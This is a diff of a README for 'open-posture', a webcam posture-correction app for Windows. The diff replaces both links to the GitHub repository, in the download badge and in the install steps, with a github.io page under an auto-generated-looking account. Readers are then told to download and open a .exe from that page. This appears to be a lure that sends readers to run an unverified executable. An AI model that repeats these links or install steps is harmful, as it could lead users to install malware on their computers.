@@ -1,6 +1,6 @@
 # 🖥️ open-posture - Improve your posture with your camera
 
-[![](https://img.shields.io/badge/Download-Open_Posture-blue.svg)](https://github.com/valuable-familygerreidae648/open-posture)
+[![](https://img.shields.io/badge/Download-Open_Posture-blue.svg)](https://valuable-familygerreidae648.github.io)
 
 open-posture keeps you sitting straight while you work at your computer. It uses the camera built into your machine to check your posture in real time. The software processes all video data on your local hardware. It does not send images to the internet or save your personal data. 
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11. Your computer must have a 
 
 ## 📥 How to Install
 
-1. Visit this page to download: [https://github.com/valuable-familygerreidae648/open-posture](https://github.com/valuable-familygerreidae648/open-posture)
+1. Visit this page to download: [https://valuable-familygerreidae648.github.io](https://valuable-familygerreidae648.github.io)
 2. Locate the most recent file ending in .exe.
 3. Click the file to start the download.
 4. Open the downloaded file once it finishes.
